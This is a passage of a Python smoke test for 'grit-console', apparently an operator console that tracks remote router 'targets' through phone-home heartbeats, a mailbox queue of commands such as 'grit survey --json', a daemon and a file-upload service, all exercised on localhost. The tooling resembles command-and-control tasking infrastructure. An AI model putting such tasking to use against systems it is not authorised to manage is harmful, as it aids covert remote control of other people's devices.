            (rec for rec in result_activity_bravo if rec.get("category") == "mailbox" and rec.get("command_id") == bravo_id),
            {},
        )
        alpha_phone_activity = next(
            (rec for rec in result_activity_alpha if rec.get("category") == "phone-home" and rec.get("operation") == "result"),
            {},
        )
        if (result_status.get("summary", {}).get("target_activity_record_count", 0) < 6 or
                result_status.get("summary", {}).get("target_activity_target_counts", {}).get("target-alpha", 0) < 3 or
                result_status.get("summary", {}).get("target_activity_target_counts", {}).get("target-bravo", 0) < 2 or
                result_status.get("summary", {}).get("target_activity_category_counts", {}).get("mailbox") != 2 or
                result_status.get("summary", {}).get("target_activity_category_counts", {}).get("phone-home", 0) < 2 or
                result_status.get("summary", {}).get("target_activity_pending_work_counts", {}).get("True", 0) < 1 or
                "mailbox" not in result_alpha_activity_categories or
                "phone-home" not in result_alpha_activity_categories or
                "heartbeat" not in result_alpha_activity_categories or
                "mailbox" not in result_bravo_activity_categories or
                "heartbeat" not in result_bravo_activity_categories or
                alpha_mailbox_activity.get("status") != "result-received" or
                alpha_mailbox_activity.get("waiting_for") != "none" or
                alpha_mailbox_activity.get("pending_work") is not False or
                alpha_mailbox_activity.get("target_connectivity_state") != "online" or
                alpha_mailbox_activity.get("target_offline_age_bucket") != "under-minute" or
                bravo_mailbox_activity.get("status") != "queued" or
                bravo_mailbox_activity.get("waiting_for") != "target-poll" or
                bravo_mailbox_activity.get("pending_work") is not True or
                bravo_mailbox_activity.get("target_connectivity_state") != "offline" or
                bravo_mailbox_activity.get("target_offline_age_bucket") != "day-plus" or
                bravo_mailbox_activity.get("target_poll_overdue") is not True or
                bravo_mailbox_activity.get("target_mailbox_pending_work_count") != 1 or
                alpha_phone_activity.get("status") != "result-received" or
                alpha_phone_activity.get("target_connectivity_state") != "online" or
                alpha_phone_activity.get("target_offline_age_bucket") != "under-minute" or
                result_status.get("summary", {}).get("target_activity_target_connectivity_state_counts", {}).get("online", 0) < len(result_activity_alpha) or
                result_status.get("summary", {}).get("target_activity_target_connectivity_state_counts", {}).get("offline", 0) < len(result_activity_bravo) or
                result_status.get("summary", {}).get("target_activity_target_offline_age_bucket_counts", {}).get("under-minute", 0) < len(result_activity_alpha) or
                result_status.get("summary", {}).get("target_activity_target_offline_age_bucket_counts", {}).get("day-plus", 0) < len(result_activity_bravo) or
                result_status.get("summary", {}).get("target_activity_target_poll_overdue_counts", {}).get("True", 0) < len(result_activity_bravo) or
                not any(rec.get("target_id") == "target-alpha" for rec in (result_status.get("target_activity_records_by_command_id") or {}).get(alpha_id, [])) or
                (result_status.get("target_activity_records_by_waiting_for") or {}).get("target-poll", [{}])[0].get("target_id") != "target-bravo" or
                ((result_status.get("target_activity_records_by_target_offline_age_bucket") or {}).get("day-plus") or [{}])[0].get("target_id") != "target-bravo" or
                ((result_status.get("target_activity_records_by_target_mailbox_pending_work_count") or {}).get("1") or [{}])[0].get("target_id") != "target-bravo" or
                "target_activity_records_by_pending_work" not in (((result_status.get("api_collections") or {}).get("target_activity_records") or {}).get("indexes") or []) or
                "target_activity_records_by_target_connectivity_state" not in (((result_status.get("api_collections") or {}).get("target_activity_records") or {}).get("indexes") or []) or
                "target_activity_records_by_target_offline_age_bucket" not in (((result_status.get("api_collections") or {}).get("target_activity_records") or {}).get("indexes") or []) or
                "target_activity_records_by_target_poll_overdue" not in (((result_status.get("api_collections") or {}).get("target_activity_records") or {}).get("indexes") or []) or
                "target_activity_records_by_target_mailbox_pending_work_count" not in (((result_status.get("api_collections") or {}).get("target_activity_records") or {}).get("indexes") or [])):
            print("target activity feed did not combine mailbox, phone-home, and heartbeat state", file=sys.stderr)
            print(json.dumps(result_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        result_status_text = run(
            "scripts/grit-console", "--config", str(poll_target_cfg),
            "--status",
        )
        if ("target-alpha label=Alpha Router" not in result_status_text.stdout or
                "state=online" not in result_status_text.stdout or
                "heartbeat_via=command-queue:command_queue_result" not in result_status_text.stdout or
                "mailbox queued=0 delivered=0 results=1 expired=0 pending=0" not in result_status_text.stdout or
                "activity mailbox none status=result-received" not in result_status_text.stdout or
                "activity mailbox none status=result-received target_state=online offline_age=under-minute" not in result_status_text.stdout or
                f"mailbox_command {alpha_id} status=result-received" not in result_status_text.stdout or
                "waiting_for=none" not in result_status_text.stdout or
                "result=completed exit=0" not in result_status_text.stdout or
                "target-bravo label=Bravo Router" not in result_status_text.stdout or
                "state=offline" not in result_status_text.stdout or
                "failed_status=rejected" not in result_status_text.stdout or
                "failed_reason=command result target mismatch" not in result_status_text.stdout or
                "poll_overdue=yes" not in result_status_text.stdout or
                "mailbox queued=1 delivered=0 results=0 expired=0 pending=1" not in result_status_text.stdout or
                "activity mailbox target-poll status=queued" not in result_status_text.stdout or
                "activity mailbox target-poll status=queued target_state=offline offline_age=day-plus" not in result_status_text.stdout or
                f"mailbox_command {bravo_id} status=queued" not in result_status_text.stdout or
                "waiting_for=target-poll reason=target-poll-overdue" not in result_status_text.stdout):
            print("text status missing intermittent mailbox heartbeat/result summary", file=sys.stderr)
            print(result_status_text.stdout, file=sys.stderr)
            return 1
        result_bravo_filter_text = run(
            "scripts/grit-console", "--config", str(poll_target_cfg),
            "--target-id", "target-bravo", "--status",
        )
        if (result_bravo_filter_text.returncode != 0 or
                "target_filter: target-bravo" not in result_bravo_filter_text.stdout or
                "phone_home=" not in result_bravo_filter_text.stdout or
                "successful_phone_home=" not in result_bravo_filter_text.stdout or
                "failed_phone_home=rejected@" not in result_bravo_filter_text.stdout or
                "selected_target_phone_home=" not in result_bravo_filter_text.stdout or
                "selected_target_failed_phone_home=" not in result_bravo_filter_text.stdout or
                "reason=command result target mismatch" not in result_bravo_filter_text.stdout):
            print("target-filtered text status missing selected target phone-home state", file=sys.stderr)
            print(result_bravo_filter_text.stdout, file=sys.stderr)
            return 1
        queue_tui_master, queue_tui_slave = pty.openpty()
        try:
            queue_tui_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(poll_target_cfg),
                ],
                cwd=ROOT,
                stdin=queue_tui_slave,
                stdout=queue_tui_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(queue_tui_slave)
            queue_tui_slave = -1
            time.sleep(0.5)
            queue_tui_output, queue_tui_stderr = run_pty_script(
                queue_tui_proc,
                queue_tui_master,
                b"20\n16\ntarget-alpha\n18\ntarget-alpha\nq\n",
                timeout=8,
            )
        finally:
            if queue_tui_slave != -1:
                os.close(queue_tui_slave)
            try:
                os.close(queue_tui_master)
            except OSError:
                pass
        queue_tui_text = queue_tui_output.decode("utf-8", errors="replace")
        if (queue_tui_proc.returncode != 0 or
                "Traceback" in (queue_tui_stderr or "") or
                "headless_command:" in queue_tui_text or
                "headless_command=" in queue_tui_text or
                "Command queue  (" not in queue_tui_text or
                "queue actions:" not in queue_tui_text or
                "needs input=" not in queue_tui_text or
                "queue COMMAND  |  queue list" not in queue_tui_text or
                "Show mailbox" not in queue_tui_text or
                "Queue command" not in queue_tui_text or
                "Clear queue" not in queue_tui_text or
                "Start mailbox listener" not in queue_tui_text or
                "command-queue:list-command-queue" in queue_tui_text or
                "command-queue:queue-command" in queue_tui_text or
                "command-queue:clear-command-queue" in queue_tui_text or
                "already-empty" in queue_tui_text or
                "already-stopped" in queue_tui_text or
                "needs-input" in queue_tui_text or
                "queues_offline_work=yes" not in queue_tui_text or
                alpha_id not in queue_tui_text or
                "result-received" not in queue_tui_text or
                "Mailbox  (" not in queue_tui_text or
                "Target detail: target-alpha label=Alpha Router" not in queue_tui_text or
                "Activity  (" not in queue_tui_text or
                "target-alpha" not in queue_tui_text or
                "mailbox" not in queue_tui_text or
                "phone-home" not in queue_tui_text or
                "selected target target-alpha label=Alpha Router" not in queue_tui_text or
                "phone_home " not in queue_tui_text or
                "target_state=online" not in queue_tui_text or
                alpha_id not in queue_tui_text or
                "result-received" not in queue_tui_text or
                "summary: status=result-received result=completed exit=0" not in queue_tui_text or
                "completed/0" not in queue_tui_text or
                bravo_id not in queue_tui_text or
                "target-bravo" not in queue_tui_text or
                "poll_overdue=yes" not in queue_tui_text or
                "created=" not in queue_tui_text):
            print("line console command queue inspection exposed noisy headless command or missed result/mailbox state", file=sys.stderr)
            print(queue_tui_text, file=sys.stderr)
            print(queue_tui_stderr or "", file=sys.stderr)
            return 1
        queue_tui_status = json.loads(run(
            "scripts/grit-console", "--config", str(poll_target_cfg),
            "--json-status",
        ).stdout)
        queue_workflow_actions = queue_tui_status.get("command_queue_workflow_actions") or []
        queue_workflow_actions_by_id = queue_tui_status.get("command_queue_workflow_actions_by_id") or {}
        queue_target_events = (queue_tui_status.get("events_by_event") or {}).get("workbench_target_inspected") or []
        if (len(queue_workflow_actions) != 6 or
                queue_workflow_actions_by_id.get("command-queue:list-command-queue", {}).get("can_run_from_curses_enter") is not True or
                queue_workflow_actions_by_id.get("command-queue:list-command-queue", {}).get("run_command", "").find("--run-command-queue-workflow-action") < 0 or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("requires_input") is not True or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("queues_offline_work") is not True or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("target_phone_home_required") is not True or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("fleet_target_count") != 2 or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("fleet_offline_target_count") != 1 or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("fleet_mailbox_pending_target_count") != 1 or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("fleet_mailbox_pending_work_count") != 1 or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("fleet_poll_overdue_target_count") != 1 or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("fleet_has_offline_targets") is not True or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("fleet_has_mailbox_pending_work") is not True or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("fleet_has_poll_overdue_targets") is not True or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("target_mailbox_pending_target_count") != 1 or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("target_mailbox_pending_work_count") != 1 or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("target_mailbox_pending_poll_overdue_count") != 1 or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("target_mailbox_pending_connectivity_state_counts", {}).get("offline") != 1 or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("target_mailbox_pending_offline_age_bucket_counts", {}).get("day-plus") != 1 or
                queue_workflow_actions_by_id.get("command-queue:queue-command", {}).get("run_command", "").find("--command-queue-workflow-command COMMAND") < 0 or
                queue_workflow_actions_by_id.get("command-queue:clear-command-queue", {}).get("requires_confirmation") is not True or
                queue_tui_status.get("summary", {}).get("command_queue_workflow_action_count") != 6 or
                queue_tui_status.get("summary", {}).get("command_queue_workflow_action_queues_offline_work_count") != 1 or
                queue_tui_status.get("summary", {}).get("command_queue_workflow_action_target_phone_home_required_count") != 1 or
                queue_tui_status.get("summary", {}).get("command_queue_workflow_action_requires_confirmation_count") != 2 or
                queue_tui_status.get("summary", {}).get("command_queue_workflow_action_fleet_mailbox_pending_work_count_counts", {}).get("1") != 6 or
                queue_tui_status.get("summary", {}).get("command_queue_workflow_action_fleet_offline_target_count_counts", {}).get("1") != 6 or
                queue_tui_status.get("summary", {}).get("command_queue_workflow_action_fleet_poll_overdue_target_count_counts", {}).get("1") != 6 or
                "command_queue_workflow_actions_by_queues_offline_work" not in ((queue_tui_status.get("api_collections") or {}).get("command_queue_workflow_actions") or {}).get("indexes", []) or
                "command_queue_workflow_actions_by_fleet_mailbox_pending_work_count" not in ((queue_tui_status.get("api_collections") or {}).get("command_queue_workflow_actions") or {}).get("indexes", []) or
                "command_queue_workflow_actions_by_fleet_has_poll_overdue_targets" not in ((queue_tui_status.get("api_collections") or {}).get("command_queue_workflow_actions") or {}).get("indexes", []) or
                not (queue_tui_status.get("events_by_event") or {}).get("workbench_command_queue_inspected") or
                not any(
                    (event.get("details") or {}).get("command_queue_workflow_action_count") == 6
                    for event in (queue_tui_status.get("events_by_event") or {}).get("workbench_command_queue_inspected", [])
                ) or
                not any(
                    (event.get("details") or {}).get("target_id") == "target-alpha" and
                    (event.get("details") or {}).get("target_activity_record_count", 0) >= 3
                    for event in queue_target_events
                )):
            print("line console command queue inspection did not record event", file=sys.stderr)
            print(json.dumps(queue_tui_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        queue_action_run = run(
            "scripts/grit-console",
            "--config", str(poll_target_cfg),
            "--run-command-queue-workflow-action", "command-queue:queue-command",
            "--command-queue-workflow-command", "grit survey --json",
        )
        if (queue_action_run.returncode != 0 or
                "command queue workflow action: command-queue:queue-command" not in queue_action_run.stdout or
                "queued " not in queue_action_run.stdout or
                "grit survey --json" not in queue_action_run.stdout):
            print("headless command queue workflow queue action failed", file=sys.stderr)
            print(queue_action_run.stdout, file=sys.stderr)
            print(queue_action_run.stderr, file=sys.stderr)
            return 1
        queue_action_list = run(
            "scripts/grit-console",
            "--config", str(poll_target_cfg),
            "--run-command-queue-workflow-action", "command-queue:list-command-queue",
        )
        if (queue_action_list.returncode != 0 or
                "command queue workflow action: command-queue:list-command-queue" not in queue_action_list.stdout or
                "grit survey --json" not in queue_action_list.stdout):
            print("headless command queue workflow list action failed", file=sys.stderr)
            print(queue_action_list.stdout, file=sys.stderr)
            print(queue_action_list.stderr, file=sys.stderr)
            return 1

        if args.section == "integration-command-queue":
            print("grit-console smoke integration-command-queue ok")
            return 0

        daemon_file_port = free_port()
        daemon_queue_port = free_port()
        while daemon_queue_port == daemon_file_port:
            daemon_queue_port = free_port()
        daemon_cfg = Path(tmp) / "server-config-daemon.json"
        daemon_state = Path(tmp) / "operator-session" / "daemon-state.json"
        daemon_staged = Path(tmp) / "operator-session" / "daemon-staged.json"
        daemon_queue = Path(tmp) / "operator-session" / "daemon-command-queue.json"
        daemon_targets = Path(tmp) / "operator-session" / "daemon-targets.json"
        daemon_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "operator_session_dir": str(Path(tmp) / "operator-session"),
            "session_root": str(Path(tmp) / "sessions-daemon"),
            "GRIT_OPERATOR_FILE_SERVICE_ENABLE": "yes",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": daemon_file_port,
            "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
            "GRIT_COMMAND_QUEUE_ENABLE": "yes",
            "GRIT_COMMAND_QUEUE_PORT": str(daemon_queue_port),
            "GRIT_COMMAND_QUEUE_TLS": "no",
            "GRIT_COMMAND_QUEUE_REQUIRE_TOKEN": "no",
            "server_state": str(daemon_state),
            "staged_files": str(daemon_staged),
            "command_queue_file": str(daemon_queue),
            "targets_file": str(daemon_targets),
        }), encoding="utf-8")
        daemon_labeled = run(
            "scripts/grit-console", "--config", str(daemon_cfg),
            "--set-target-label", "daemon-target",
            "--target-label", "Daemon Target",
        )
        if daemon_labeled.returncode != 0:
            print("operator daemon target label setup failed", file=sys.stderr)
            print(daemon_labeled.stdout, file=sys.stderr)
            print(daemon_labeled.stderr, file=sys.stderr)
            return 1
        daemon_queued = run(
            "scripts/grit-console", "--config", str(daemon_cfg),
            "--target-id", "daemon-target",
            "--queue-command", "grit survey --json",
        )
        if daemon_queued.returncode != 0:
            print("operator daemon queued work setup failed", file=sys.stderr)
            print(daemon_queued.stdout, file=sys.stderr)
            print(daemon_queued.stderr, file=sys.stderr)
            return 1
        daemon_restart_proc = None
        daemon_proc = subprocess.Popen(
            [
                str(server),
                "--config", str(daemon_cfg),
                "--daemon",
                "--daemon-service", "file-service",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        try:
            daemon_doc = {}
            deadline = time.time() + 20
            while time.time() < deadline:
                if daemon_proc.poll() is not None:
                    break
                daemon_status = run(
                    "scripts/grit-console",
                    "--config", str(daemon_cfg),
                    "--json-status",
                )
                if daemon_status.returncode == 0:
                    daemon_doc = json.loads(daemon_status.stdout)
                    services_by_name = daemon_doc.get("services_by_name") or {}
                    if services_by_name.get("file-service", {}).get("actual") == "listening":
                        break
                time.sleep(0.1)
            services_by_name = daemon_doc.get("services_by_name") or {}
            daemon_state_doc = json.loads(daemon_state.read_text(encoding="utf-8"))
            operator_daemon_state = (daemon_state_doc.get("services") or {}).get("operator-daemon") or {}
            daemon_actions = daemon_doc.get("operator_daemon_workflow_actions") or []
            daemon_actions_by_id = daemon_doc.get("operator_daemon_workflow_actions_by_id") or {}
            if (services_by_name.get("file-service", {}).get("actual") != "listening" or
                    services_by_name.get("file-service", {}).get("configured") != "listening" or
                    operator_daemon_state.get("status") != "listening" or
                    operator_daemon_state.get("daemon_services") != ["file-service"] or
                    len(operator_daemon_state.get("child_pids") or []) != 1):
                print("operator daemon did not own configured child listeners", file=sys.stderr)
                print(json.dumps(daemon_doc, indent=2, sort_keys=True), file=sys.stderr)
                print(json.dumps(daemon_state_doc, indent=2, sort_keys=True), file=sys.stderr)
                for log_path in sorted((Path(tmp) / "operator-session" / "daemon-logs").glob("*.log")):
                    print(f"{log_path.name}:", file=sys.stderr)
                    print(log_path.read_text(encoding="utf-8", errors="replace"), file=sys.stderr)
                return 1
            if (len(daemon_actions) != 9 or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("operator_action_state") != "already-running" or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("run_command", "").find("--run-operator-daemon-workflow-action operator-daemon-start") == -1 or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("dry_run_command", "").find("--operator-daemon-workflow-dry-run") == -1 or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("daemon_attached") is not True or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("daemon_child_alive_count") != 1 or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("control_state_file") != str(daemon_state) or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("control_state_exists") is not True or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("command_queue_file") != str(daemon_queue) or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("command_queue_file_exists") is not True or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("command_queue_command_count") != 1 or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("command_queue_queued_count") != 1 or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("command_queue_target_count") != 1 or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("targets_file") != str(daemon_targets) or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("targets_file_exists") is not True or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("target_count") != 1 or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("fleet_target_count") != 1 or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("fleet_mailbox_pending_work_count") != 1 or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("fleet_has_mailbox_pending_work") is not True or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("staged_files_file") != str(daemon_staged) or
                    daemon_actions_by_id.get("operator-daemon-start", {}).get("workbench_jobs_file") != str(Path(tmp) / "operator-session" / "workbench-jobs.json") or
                    daemon_actions_by_id.get("operator-daemon-stop", {}).get("can_run_from_curses_enter") is not True or
                    daemon_actions_by_id.get("operator-daemon-stop", {}).get("operator_action_reason") != "confirmation-required" or
                    daemon_actions_by_id.get("operator-daemon-stop", {}).get("run_command", "").find("--confirm-operator-daemon-workflow-action") == -1 or
                    daemon_actions_by_id.get("systemd-user-status", {}).get("workflow") != "systemd-user-service" or
                    daemon_actions_by_id.get("systemd-user-status", {}).get("run_command", "").find("--run-operator-daemon-workflow-action systemd-user-status") == -1 or
                    daemon_doc.get("summary", {}).get("operator_daemon_workflow_action_count") != 9 or
                    daemon_doc.get("summary", {}).get("operator_daemon_workflow_action_attached_count") != 9 or
                    daemon_doc.get("summary", {}).get("operator_daemon_workflow_action_workflow_counts", {}).get("operator-daemon") != 3 or
                    daemon_doc.get("summary", {}).get("operator_daemon_workflow_action_workflow_counts", {}).get("systemd-user-service") != 6 or
                    daemon_doc.get("summary", {}).get("operator_daemon_workflow_action_command_queue_command_count_counts", {}).get("1") != 9 or
                    daemon_doc.get("summary", {}).get("operator_daemon_workflow_action_target_count_counts", {}).get("1") != 9 or
                    daemon_doc.get("summary", {}).get("operator_daemon_workflow_action_fleet_target_count_counts", {}).get("1") != 9 or
                    daemon_doc.get("summary", {}).get("operator_daemon_workflow_action_fleet_mailbox_pending_work_count_counts", {}).get("1") != 9 or
                    daemon_doc.get("summary", {}).get("operator_daemon_workflow_action_fleet_has_mailbox_pending_work_counts", {}).get("True") != 9 or
                    ((daemon_doc.get("operator_daemon_workflow_actions_by_command_queue_queued_count") or {}).get("1") or [{}])[0].get("id") != "operator-daemon-start" or
                    ((daemon_doc.get("operator_daemon_workflow_actions_by_target_count") or {}).get("1") or [{}])[0].get("id") != "operator-daemon-start" or
                    ((daemon_doc.get("operator_daemon_workflow_actions_by_fleet_mailbox_pending_work_count") or {}).get("1") or [{}])[0].get("id") != "operator-daemon-start" or
                    "operator_daemon_workflow_actions_by_daemon_attached" not in ((daemon_doc.get("api_collections") or {}).get("operator_daemon_workflow_actions") or {}).get("indexes", []) or
                    "operator_daemon_workflow_actions_by_command_queue_command_count" not in ((daemon_doc.get("api_collections") or {}).get("operator_daemon_workflow_actions") or {}).get("indexes", []) or
                    "operator_daemon_workflow_actions_by_fleet_mailbox_pending_work_count" not in ((daemon_doc.get("api_collections") or {}).get("operator_daemon_workflow_actions") or {}).get("indexes", []) or
                    "operator_daemon_workflow_actions_by_target_count" not in ((daemon_doc.get("api_collections") or {}).get("operator_daemon_workflow_actions") or {}).get("indexes", [])):
                print("operator daemon workflow actions missing attached daemon state", file=sys.stderr)
                print(json.dumps(daemon_doc, indent=2, sort_keys=True), file=sys.stderr)
                return 1
            daemon_action_status = run(
                "scripts/grit-console",
                "--config", str(daemon_cfg),
                "--run-operator-daemon-workflow-action", "operator-daemon-status",
            )
            if (daemon_action_status.returncode != 0 or
                    "operator daemon workflow action: operator-daemon-status" not in daemon_action_status.stdout or
                    "griTTYkit server status" not in daemon_action_status.stdout):
                print("headless operator daemon workflow status action failed", file=sys.stderr)
                print(daemon_action_status.stdout, file=sys.stderr)
                print(daemon_action_status.stderr, file=sys.stderr)
                return 1
            daemon_action_dry_run = run(
                "scripts/grit-console",
                "--config", str(daemon_cfg),
                "--run-operator-daemon-workflow-action", "operator-daemon-start",
                "--operator-daemon-workflow-dry-run",
            )
            if (daemon_action_dry_run.returncode != 0 or
                    "operator daemon workflow action: operator-daemon-start" not in daemon_action_dry_run.stdout or
                    "dry_run=yes" not in daemon_action_dry_run.stdout or
                    "command=scripts/grit-console --config" not in daemon_action_dry_run.stdout or
                    "--daemon --daemon-service file-service" not in daemon_action_dry_run.stdout or
                    "headless_command=" in daemon_action_dry_run.stdout):
                print("headless operator daemon workflow dry-run action failed", file=sys.stderr)
                print(daemon_action_dry_run.stdout, file=sys.stderr)
                print(daemon_action_dry_run.stderr, file=sys.stderr)
                return 1
            daemon_systemd_action = run(
                "scripts/grit-console",
                "--config", str(daemon_cfg),
                "--run-operator-daemon-workflow-action", "systemd-user-status",
                "--operator-daemon-workflow-dry-run",
            )
            if (daemon_systemd_action.returncode != 0 or
                    "operator daemon workflow action: systemd-user-status" not in daemon_systemd_action.stdout or
                    "workbench action: systemd-user-status" not in daemon_systemd_action.stdout or
                    "--systemd-user-action status --systemd-user-dry-run" not in daemon_systemd_action.stdout):
                print("headless operator daemon workflow systemd dry-run action failed", file=sys.stderr)
                print(daemon_systemd_action.stdout, file=sys.stderr)
                print(daemon_systemd_action.stderr, file=sys.stderr)
                return 1
            daemon_upload_response = connect_with_retry(daemon_file_port, (
                b"PUT /upload/daemon.txt HTTP/1.1\r\n"
                b"Host: 127.0.0.1\r\n"
                b"X-Grit-Target-Id: daemon-target\r\n"
                b"Content-Length: 13\r\n"
                b"Connection: close\r\n\r\n"
                b"daemon upload"
            ))
            if b"HTTP/1.1 200 OK" not in daemon_upload_response:
                print("operator daemon file-service child did not accept an upload", file=sys.stderr)
                print(daemon_upload_response.decode("utf-8", errors="replace"), file=sys.stderr)
                return 1
            daemon_stop = run(
                "scripts/grit-console",
                "--config", str(daemon_cfg),
                "--stop",
            )
            if daemon_stop.returncode != 0 or "failed=0" not in daemon_stop.stdout:
                print("operator daemon stop failed", file=sys.stderr)
                print(daemon_stop.stdout, file=sys.stderr)
                print(daemon_stop.stderr, file=sys.stderr)
                return 1
            daemon_stdout, daemon_stderr = daemon_proc.communicate(timeout=8)
            if daemon_proc.returncode not in (0, -signal.SIGTERM):
                print("operator daemon exited unexpectedly", file=sys.stderr)
                print(daemon_stdout, file=sys.stderr)
                print(daemon_stderr, file=sys.stderr)
                return 1
            stopped_doc = json.loads(run(
                "scripts/grit-console",
                "--config", str(daemon_cfg),
                "--json-status",
            ).stdout)
            stopped_services = stopped_doc.get("services_by_name") or {}
            daemon_state_after = json.loads(daemon_state.read_text(encoding="utf-8"))
            stopped_daemon_state = daemon_state_after.get("services") or {}
            daemon_events = [
                json.loads(line)
                for line in (Path(tmp) / "operator-session" / "events.jsonl").read_text(encoding="utf-8").splitlines()
                if line.strip()
            ]
            if (stopped_services.get("file-service", {}).get("actual") != "stopped" or
                    stopped_daemon_state.get("operator-daemon", {}).get("status") != "stopped"):
                print("operator daemon stop did not release child listeners", file=sys.stderr)
                print(json.dumps(stopped_doc, indent=2, sort_keys=True), file=sys.stderr)
                print(json.dumps(daemon_state_after, indent=2, sort_keys=True), file=sys.stderr)
                return 1
            if (not any(
                        event.get("event") == "operator_daemon_workflow_action_completed" and
                        event.get("details", {}).get("id") == "operator-daemon-status" and
                        event.get("details", {}).get("fleet_mailbox_pending_work_count") == 1 and
                        event.get("details", {}).get("returncode") == 0
                        for event in daemon_events) or
                    not any(
                        event.get("event") == "operator_daemon_workflow_action_dry_run" and
                        event.get("details", {}).get("id") == "operator-daemon-start" and
                        event.get("details", {}).get("fleet_has_mailbox_pending_work") is True
                        for event in daemon_events) or
                    not any(
                        event.get("event") == "daemon_starting" and
                        "--daemon --daemon-service file-service" in event.get("details", {}).get("headless_command", "")
                        for event in daemon_events) or
                    not any(
                        event.get("event") == "daemon_child_start" and
                        event.get("details", {}).get("service") == "file-service" and
                        "--transport file-service" in event.get("details", {}).get("headless_command", "") and
                        "--daemon --daemon-service file-service" in event.get("details", {}).get("daemon_headless_command", "")
                        for event in daemon_events) or
                    not any(
                        event.get("event") == "service_stop" and
                        event.get("service") == "file-service" and
                        event.get("details", {}).get("via") == "server-stop" and
                        "--stop" in event.get("details", {}).get("headless_command", "")
                        for event in daemon_events) or
                    not any(
                        event.get("event") == "daemon_stopped" and
                        "--daemon --daemon-service file-service" in event.get("details", {}).get("headless_command", "")
                        for event in daemon_events)):
                print("operator daemon lifecycle events missing headless command metadata", file=sys.stderr)
                print(json.dumps(daemon_events[-16:], indent=2, sort_keys=True), file=sys.stderr)
                return 1
            daemon_restart_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(daemon_cfg),
                    "--daemon",
                    "--daemon-service", "file-service",
                ],
                cwd=ROOT,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            restarted_doc = {}
            deadline = time.time() + 20
            while time.time() < deadline:
                if daemon_restart_proc.poll() is not None:
                    break
                restarted_status = run(
                    "scripts/grit-console",
                    "--config", str(daemon_cfg),
                    "--json-status",
                )
                if restarted_status.returncode == 0:
                    restarted_doc = json.loads(restarted_status.stdout)
                    restarted_services = restarted_doc.get("services_by_name") or {}
                    if restarted_services.get("file-service", {}).get("actual") == "listening":
                        break
                time.sleep(0.1)
            restarted_services = restarted_doc.get("services_by_name") or {}
            restarted_actions_by_id = restarted_doc.get("operator_daemon_workflow_actions_by_id") or {}
            restarted_queue = restarted_doc.get("command_queue") or {}
            restarted_queue_by_target = restarted_queue.get("commands_by_target_id") or {}
            restarted_target_commands = restarted_queue_by_target.get("daemon-target") or []
            if (restarted_services.get("file-service", {}).get("actual") != "listening" or
                    restarted_actions_by_id.get("operator-daemon-start", {}).get("daemon_attached") is not True or
                    restarted_actions_by_id.get("operator-daemon-start", {}).get("command_queue_command_count") != 1 or
                    restarted_actions_by_id.get("operator-daemon-start", {}).get("command_queue_queued_count") != 1 or
                    restarted_actions_by_id.get("operator-daemon-start", {}).get("command_queue_target_count") != 1 or
                    restarted_actions_by_id.get("operator-daemon-start", {}).get("target_count") != 1 or
                    restarted_actions_by_id.get("operator-daemon-start", {}).get("fleet_mailbox_pending_work_count") != 1 or
                    restarted_doc.get("summary", {}).get("operator_daemon_workflow_action_fleet_mailbox_pending_work_count_counts", {}).get("1") != 9 or
                    not restarted_target_commands or
                    restarted_target_commands[0].get("command") != "grit survey --json"):
                print("operator daemon restart did not preserve queued target work", file=sys.stderr)
                print(json.dumps(restarted_doc, indent=2, sort_keys=True), file=sys.stderr)
                return 1
            daemon_restart_stop = run(
                "scripts/grit-console",
                "--config", str(daemon_cfg),
                "--stop",
            )
            if daemon_restart_stop.returncode != 0 or "failed=0" not in daemon_restart_stop.stdout:
                print("operator daemon restart stop failed", file=sys.stderr)
                print(daemon_restart_stop.stdout, file=sys.stderr)
                print(daemon_restart_stop.stderr, file=sys.stderr)
                return 1
            daemon_restart_stdout, daemon_restart_stderr = daemon_restart_proc.communicate(timeout=8)
            if daemon_restart_proc.returncode not in (0, -signal.SIGTERM):
                print("restarted operator daemon exited unexpectedly", file=sys.stderr)
